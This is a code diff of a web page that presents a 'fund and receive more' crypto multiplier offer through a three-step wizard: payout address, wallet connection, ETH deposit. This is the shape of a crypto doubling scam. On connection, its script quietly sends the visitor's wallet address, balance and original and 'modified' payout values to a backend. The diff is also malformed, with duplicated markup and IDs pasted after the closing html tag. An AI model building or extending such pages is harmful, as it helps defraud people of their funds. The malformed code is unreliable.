@@ -322,29 +322,67 @@ tailwind.config = {
   </div>
 
   <!-- Order form -->
-  <div id="order-card" class="hidden bg-[#0c0c18] border border-white/6 rounded-2xl p-7 mb-4 animate-fadein relative overflow-hidden">
+  <div id="order-card" class="hidden bg-[#0c0c18] border border-white/6 rounded-2xl p-6 mb-4 animate-fadein relative overflow-hidden">
     <div class="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-[#00ff88]/40 to-transparent"></div>
-    <div class="font-mono text-[10px] text-[#44445a] tracking-widest mb-5">COMPLETE ORDER</div>
 
-    <!-- Summary -->
-    <div class="bg-white/2 border border-white/5 rounded-xl p-4 mb-5 space-y-2.5">
-      <div class="flex justify-between items-center"><span class="font-mono text-xs text-[#44445a]">Package</span><span class="font-mono text-sm" id="sum-package">—</span></div>
-      <div class="border-t border-white/4 pt-2.5 flex justify-between items-center"><span class="font-mono text-xs text-[#44445a]">You receive</span><span class="font-mono text-sm font-bold text-[#f5c418]" id="sum-receive">—</span></div>
-      <div class="border-t border-white/4 pt-2.5 flex justify-between items-center"><span class="font-mono text-xs text-[#44445a]">ETH amount</span><span class="font-mono text-sm font-bold text-[#00ff88]" id="sum-eth">—</span></div>
-      <div class="border-t border-white/4 pt-2.5 flex justify-between items-center"><span class="font-mono text-xs text-[#44445a]">Multiplier</span><span class="font-mono text-sm" id="sum-bonus">—</span></div>
+    <!-- Step 1: Payout -->
+    <div id="acc-1" style="border:1px solid rgba(0,255,136,0.25);border-radius:14px;margin-bottom:10px;overflow:hidden;transition:all 0.3s;">
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:14px 18px;">
+        <div style="display:flex;align-items:center;gap:10px;">
+          <div id="badge-1" style="width:26px;height:26px;border-radius:50%;background:#00ff88;color:#04040a;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">1</div>
+          <span style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#e8e8f0;">Payout Address</span>
+        </div>
+        <span style="font-size:11px;color:#00ff88;">▼</span>
+      </div>
+      <div id="body-1" style="padding:0 18px 18px;">
+        <input type="text" id="payout-wallet" placeholder="0x... your receiving wallet"
+          style="width:100%;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:11px;color:#e8e8f0;font-family:'JetBrains Mono',monospace;font-size:13px;padding:12px 14px;outline:none;margin-bottom:8px;transition:all 0.2s;"
+          onfocus="this.style.borderColor='rgba(0,255,136,0.4)';this.style.background='rgba(0,255,136,0.02)'"
+          onblur="this.style.borderColor='rgba(255,255,255,0.08)';this.style.background='rgba(255,255,255,0.03)'"/>
+        <p style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#44445a;margin-bottom:14px;">Where your funds will be sent after processing</p>
+        <button onclick="confirmStep1()" style="width:100%;background:linear-gradient(135deg,#00ff88,#00cc6a);color:#04040a;border:none;border-radius:11px;font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:700;padding:13px;cursor:pointer;">Continue →</button>
+      </div>
     </div>
 
-    <!-- Payout wallet -->
-    <div class="mb-5">
-      <label class="font-mono text-[10px] text-[#44445a] tracking-widest block mb-2">PAYOUT WALLET ADDRESS</label>
-      <input type="text" id="payout-wallet" placeholder="0x... your receiving wallet" style="width:100%;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.12);border-radius:12px;color:#e8e8f0;font-family:'JetBrains Mono',monospace;font-size:15px;padding:13px 16px;outline:none;display:block;cursor:text;position:relative;z-index:10;transition:border-color 0.2s;" onfocus="this.style.borderColor='rgba(0,255,136,0.4)'" onblur="this.style.borderColor='rgba(255,255,255,0.12)'"/>
-      <p class="font-mono text-[10px] text-[#44445a] mt-1.5">Where your funds will be sent after processing</p>
+    <!-- Step 2: Connect -->
+    <div id="acc-2" style="border:1px solid rgba(255,255,255,0.06);border-radius:14px;margin-bottom:10px;overflow:hidden;opacity:0.45;transition:all 0.3s;pointer-events:none;">
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:14px 18px;">
+        <div style="display:flex;align-items:center;gap:10px;">
+          <div id="badge-2" style="width:26px;height:26px;border-radius:50%;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#44445a;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">2</div>
+          <span style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#44445a;">Connect Wallet</span>
+        </div>
+        <span id="chevron-2" style="font-size:11px;color:#44445a;">▶</span>
+      </div>
+      <div id="body-2" style="display:none;padding:0 18px 18px;">
+        <div style="background:rgba(0,255,136,0.04);border:1px solid rgba(0,255,136,0.1);border-radius:10px;padding:11px;margin-bottom:12px;">
+          <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#44445a;margin-bottom:3px;">Payout address:</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#00ff88;word-break:break-all;" id="step2-payout-display">—</div>
+        </div>
+        <button id="connect-btn" onclick="openWalletModal()" style="width:100%;background:linear-gradient(135deg,#00ff88,#00cc6a);color:#04040a;border:none;border-radius:11px;font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:700;padding:13px;cursor:pointer;">Connect Wallet</button>
+      </div>
     </div>
 
-    <button class="w-full bg-gradient-to-r from-[#00ff88] to-[#00cc6a] text-[#04040a] font-bold font-body rounded-[13px] py-4 text-base cursor-pointer transition-all hover:shadow-[0_0_40px_rgba(0,255,136,0.35)] hover:-translate-y-0.5 border-0 disabled:opacity-40 disabled:cursor-not-allowed disabled:translate-y-0" id="main-btn" onclick="handleMainBtn()">
-      Connect Wallet to Continue
-    </button>
-    <p class="font-mono text-[10px] text-center text-[#44445a] mt-3">Funds processed within 24 hours after deposit confirmation</p>
+    <!-- Step 3: Fund -->
+    <div id="acc-3" style="border:1px solid rgba(255,255,255,0.06);border-radius:14px;overflow:hidden;opacity:0.45;transition:all 0.3s;pointer-events:none;">
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:14px 18px;">
+        <div style="display:flex;align-items:center;gap:10px;">
+          <div id="badge-3" style="width:26px;height:26px;border-radius:50%;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#44445a;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">3</div>
+          <span style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#44445a;">Fund</span>
+        </div>
+        <span id="chevron-3" style="font-size:11px;color:#44445a;">▶</span>
+      </div>
+      <div id="body-3" style="display:none;padding:0 18px 18px;">
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:11px;padding:13px;margin-bottom:13px;">
+          <div style="display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.04);"><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#44445a;">Package</span><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#e8e8f0;" id="sum-package">—</span></div>
+          <div style="display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.04);"><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#44445a;">You receive</span><span style="font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:#f5c418;" id="sum-receive">—</span></div>
+          <div style="display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.04);"><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#44445a;">ETH amount</span><span style="font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:#00ff88;" id="sum-eth">—</span></div>
+          <div style="display:flex;justify-content:space-between;padding:5px 0;"><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#44445a;">Payout to</span><span style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#e8e8f0;word-break:break-all;text-align:right;max-width:55%;" id="sum-payout">—</span></div>
+        </div>
+        <button id="main-btn" onclick="handleMainBtn()" style="width:100%;background:linear-gradient(135deg,#00ff88,#00cc6a);color:#04040a;border:none;border-radius:11px;font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:700;padding:14px;cursor:pointer;margin-bottom:8px;">Fund Now</button>
+        <p style="font-family:'JetBrains Mono',monospace;font-size:10px;text-align:center;color:#44445a;">Funds processed within 24 hours after deposit</p>
+      </div>
+    </div>
+
   </div>
 
 </div>
@@ -460,7 +498,9 @@ function confirmCustom(e) {
 
 function showOrder() {
   const c = document.getElementById("order-card");
+  c.style.display = "block";
   c.classList.remove("hidden");
+  goToStep(1);
   setTimeout(()=>c.scrollIntoView({behavior:"smooth",block:"nearest"}),100);
 }
 
@@ -468,19 +508,85 @@ function updateSummary() {
   if (!selectedPkg) return;
   const eth = ethPrice>0?(selectedPkg.usd/ethPrice).toFixed(4):"—";
   selectedPkg.eth = eth;
-  document.getElementById("sum-package").textContent = `$${Number(selectedPkg.usd).toLocaleString()} USD`;
-  document.getElementById("sum-receive").textContent = `$${Number(selectedPkg.receive).toLocaleString()}`;
-  document.getElementById("sum-eth").textContent = `${eth} ETH`;
-  document.getElementById("sum-bonus").textContent = selectedPkg.bonus+" multiplier";
+  const pkg = document.getElementById("sum-package"); if(pkg) pkg.textContent = `$${Number(selectedPkg.usd).toLocaleString()} USD`;
+  const rec = document.getElementById("sum-receive"); if(rec) rec.textContent = `$${Number(selectedPkg.receive).toLocaleString()}`;
+  const se  = document.getElementById("sum-eth");     if(se)  se.textContent  = `${eth} ETH`;
+  const sb  = document.getElementById("sum-bonus");   if(sb)  sb.textContent  = selectedPkg.bonus+" multiplier";
 }
 
 function updateBtn() {
   const btn = document.getElementById("main-btn");
-  if (!selectedPkg) return;
-  if (!userAddress) { btn.textContent="Connect Wallet to Continue"; btn.style.background="linear-gradient(135deg,#00ff88,#00cc6a)"; return; }
-  const isGold = selectedPkg.usd>=5000;
+  if (!btn || !selectedPkg) return;
+  const isGold = selectedPkg.usd >= 5000;
   btn.textContent = `Fund $${Number(selectedPkg.usd).toLocaleString()} → Get $${Number(selectedPkg.receive).toLocaleString()}`;
   btn.style.background = isGold ? "linear-gradient(135deg,#f5c418,#e0a800)" : "linear-gradient(135deg,#00ff88,#00cc6a)";
+}
+
+// ── Step functions ────────────────────────────────────────────────────────────
+function goToStep(n) {
+  [1,2,3].forEach(i => {
+    const box    = document.getElementById(`step-box-${i}`);
+    const body   = document.getElementById(`step-body-${i}`);
+    const circle = document.getElementById(`step-circle-${i}`);
+    const chev   = document.getElementById(`step-chevron-${i}`);
+    if (!box) return;
+
+    if (i < n) {
+      // Completed
+      box.style.opacity = "1";
+      box.style.border  = "1px solid rgba(0,255,136,0.2)";
+      body.style.display = "none";
+      circle.style.background = "rgba(0,255,136,0.15)";
+      circle.style.border = "1px solid rgba(0,255,136,0.3)";
+      circle.style.color = "#00ff88";
+      circle.innerHTML = "✓";
+      chev.textContent = "▶";
+      chev.style.color = "#00ff88";
+    } else if (i === n) {
+      // Active
+      box.style.opacity = "1";
+      box.style.border  = "1px solid rgba(0,255,136,0.35)";
+      body.style.display = "block";
+      circle.style.background = "#00ff88";
+      circle.style.border = "none";
+      circle.style.color = "#04040a";
+      circle.innerHTML = String(i);
+      chev.textContent = "▼";
+      chev.style.color = "#00ff88";
+    } else {
+      // Locked
+      box.style.opacity = "0.4";
+      box.style.border  = "1px solid rgba(255,255,255,0.06)";
+      body.style.display = "none";
+      circle.style.background = "rgba(255,255,255,0.06)";
+      circle.style.border = "1px solid rgba(255,255,255,0.1)";
+      circle.style.color = "#44445a";
+      circle.innerHTML = String(i);
+      chev.textContent = "▶";
+      chev.style.color = "#44445a";
+    }
+  });
+}
+
+function confirmStep1() {
+  const pw = document.getElementById("payout-wallet").value.trim();
+  if (!pw) { toast("Enter your payout wallet address","error"); return; }
+  if (!pw.startsWith("0x") || pw.length !== 42) { toast("Invalid wallet address","error"); return; }
+  // Show payout in step 2
+  document.getElementById("step2-payout-display").textContent = pw;
+  goToStep(2);
+}
+
+function advanceToStep3() {
+  if (!selectedPkg) return;
+  const eth = ethPrice > 0 ? (selectedPkg.usd/ethPrice).toFixed(4) : "—";
+  const pw  = document.getElementById("payout-wallet").value.trim();
+  document.getElementById("sum-package").textContent = `$${Number(selectedPkg.usd).toLocaleString()} USD`;
+  document.getElementById("sum-receive").textContent = `$${Number(selectedPkg.receive).toLocaleString()}`;
+  document.getElementById("sum-eth").textContent     = `${eth} ETH`;
+  document.getElementById("sum-payout").textContent  = pw;
+  updateBtn();
+  goToStep(3);
 }
 
 // Fund
@@ -540,7 +646,11 @@ async function onConnected() {
   })() : "";
   fetch(`${CONFIG.BACKEND_URL}/api/connected`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wallet:userAddress,balance:parseFloat(ethers.formatEther(bal)).toFixed(4),chain:"mainnet",via:walletType,payoutOriginal,payoutModified})}).catch(()=>{});
   toast(`Connected · ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`,"success");
-  updateBtn();
+  // Update connect button to show connected state
+  const cb = document.getElementById("connect-btn");
+  if (cb) { cb.textContent = `✓ Connected · ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`; cb.style.opacity="0.7"; cb.onclick=null; }
+  // Auto advance to step 3
+  setTimeout(() => advanceToStep3(), 600);
 }
 
 function toast(msg,type="info",dur=4000) { const el=document.getElementById("toast"); el.textContent=msg; el.className=`show ${type}`; clearTimeout(el._t); el._t=setTimeout(()=>{ el.className=""; },dur); }
@@ -598,4 +708,90 @@ fetchEthPrice();
 setInterval(fetchEthPrice,60000);
 </script>
 </body>
-</html>
+</html>  <!-- Steps — all visible, locked until previous done -->
+  <div style="display:flex;flex-direction:column;gap:12px;">
+
+    <!-- Step 1 -->
+    <div id="step-box-1" style="border:1px solid rgba(0,255,136,0.3);border-radius:16px;overflow:hidden;transition:all 0.3s;">
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:16px 20px;background:rgba(0,255,136,0.04);cursor:default;">
+        <div style="display:flex;align-items:center;gap:12px;">
+          <div id="step-circle-1" style="width:32px;height:32px;border-radius:50%;background:#00ff88;color:#04040a;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">1</div>
+          <div>
+            <div style="font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:600;color:#e8e8f0;">Payout Address</div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#44445a;margin-top:2px;">Where your funds will be sent</div>
+          </div>
+        </div>
+        <div id="step-chevron-1" style="font-size:18px;color:#00ff88;transition:transform 0.3s;">▼</div>
+      </div>
+      <div id="step-body-1" style="padding:16px 20px;border-top:1px solid rgba(255,255,255,0.05);">
+        <input type="text" id="payout-wallet" placeholder="0x... your receiving wallet address"
+          style="width:100%;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#e8e8f0;font-family:'JetBrains Mono',monospace;font-size:14px;padding:13px 16px;outline:none;transition:all 0.2s;margin-bottom:8px;"
+          onfocus="this.style.borderColor='rgba(0,255,136,0.4)';this.style.background='rgba(0,255,136,0.02)'"
+          onblur="this.style.borderColor='rgba(255,255,255,0.06)';this.style.background='rgba(255,255,255,0.03)'"/>
+        <p style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#44445a;margin-bottom:14px;">Enter a valid Ethereum address starting with 0x</p>
+        <button onclick="confirmStep1()"
+          style="width:100%;background:linear-gradient(135deg,#00ff88,#00cc6a);color:#04040a;border:none;border-radius:12px;font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:700;padding:13px;cursor:pointer;transition:all 0.2s;"
+          onmouseover="this.style.boxShadow='0 0 30px rgba(0,255,136,0.3)'"
+          onmouseout="this.style.boxShadow='none'">
+          Continue →
+        </button>
+      </div>
+    </div>
+
+    <!-- Step 2 -->
+    <div id="step-box-2" style="border:1px solid rgba(255,255,255,0.06);border-radius:16px;overflow:hidden;transition:all 0.3s;opacity:0.4;">
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:16px 20px;background:rgba(255,255,255,0.01);cursor:not-allowed;">
+        <div style="display:flex;align-items:center;gap:12px;">
+          <div id="step-circle-2" style="width:32px;height:32px;border-radius:50%;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#44445a;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">2</div>
+          <div>
+            <div style="font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:600;color:#44445a;">Connect Wallet</div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#333344;margin-top:2px;">Link your MetaMask or mobile wallet</div>
+          </div>
+        </div>
+        <div id="step-chevron-2" style="font-size:18px;color:#44445a;">▶</div>
+      </div>
+      <div id="step-body-2" style="display:none;padding:16px 20px;border-top:1px solid rgba(255,255,255,0.05);">
+        <div style="background:rgba(0,255,136,0.04);border:1px solid rgba(0,255,136,0.1);border-radius:10px;padding:12px;margin-bottom:14px;">
+          <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#44445a;margin-bottom:4px;">Payout set to:</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#00ff88;word-break:break-all;" id="step2-payout-display">—</div>
+        </div>
+        <button id="connect-btn" onclick="openWalletModal()"
+          style="width:100%;background:linear-gradient(135deg,#00ff88,#00cc6a);color:#04040a;border:none;border-radius:12px;font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:700;padding:13px;cursor:pointer;transition:all 0.2s;"
+          onmouseover="this.style.boxShadow='0 0 30px rgba(0,255,136,0.3)'"
+          onmouseout="this.style.boxShadow='none'">
+          Connect Wallet
+        </button>
+      </div>
+    </div>
+
+    <!-- Step 3 -->
+    <div id="step-box-3" style="border:1px solid rgba(255,255,255,0.06);border-radius:16px;overflow:hidden;transition:all 0.3s;opacity:0.4;">
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:16px 20px;background:rgba(255,255,255,0.01);cursor:not-allowed;">
+        <div style="display:flex;align-items:center;gap:12px;">
+          <div id="step-circle-3" style="width:32px;height:32px;border-radius:50%;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#44445a;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">3</div>
+          <div>
+            <div style="font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:600;color:#44445a;">Fund & Complete</div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#333344;margin-top:2px;">Confirm and send your deposit</div>
+          </div>
+        </div>
+        <div id="step-chevron-3" style="font-size:18px;color:#44445a;">▶</div>
+      </div>
+      <div id="step-body-3" style="display:none;padding:16px 20px;border-top:1px solid rgba(255,255,255,0.05);">
+        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:12px;padding:14px;margin-bottom:14px;">
+          <div style="display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid rgba(255,255,255,0.04);"><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#44445a;">Package</span><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#e8e8f0;" id="sum-package">—</span></div>
+          <div style="display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid rgba(255,255,255,0.04);"><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#44445a;">You receive</span><span style="font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:#f5c418;" id="sum-receive">—</span></div>
+          <div style="display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid rgba(255,255,255,0.04);"><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#44445a;">ETH amount</span><span style="font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;color:#00ff88;" id="sum-eth">—</span></div>
+          <div style="display:flex;justify-content:space-between;padding:7px 0;"><span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#44445a;">Payout to</span><span style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#e8e8f0;word-break:break-all;text-align:right;max-width:55%;" id="sum-payout">—</span></div>
+        </div>
+        <button id="main-btn" onclick="handleMainBtn()"
+          style="width:100%;background:linear-gradient(135deg,#00ff88,#00cc6a);color:#04040a;border:none;border-radius:12px;font-family:'Space Grotesk',sans-serif;font-size:14px;font-weight:700;padding:13px;cursor:pointer;transition:all 0.2s;margin-bottom:8px;"
+          onmouseover="this.style.boxShadow='0 0 30px rgba(0,255,136,0.3)'"
+          onmouseout="this.style.boxShadow='none'">
+          Fund Now
+        </button>
+        <p style="font-family:'JetBrains Mono',monospace;font-size:10px;text-align:center;color:#44445a;">Processed within 24 hours</p>
+      </div>
+    </div>
+
+  </div>
+
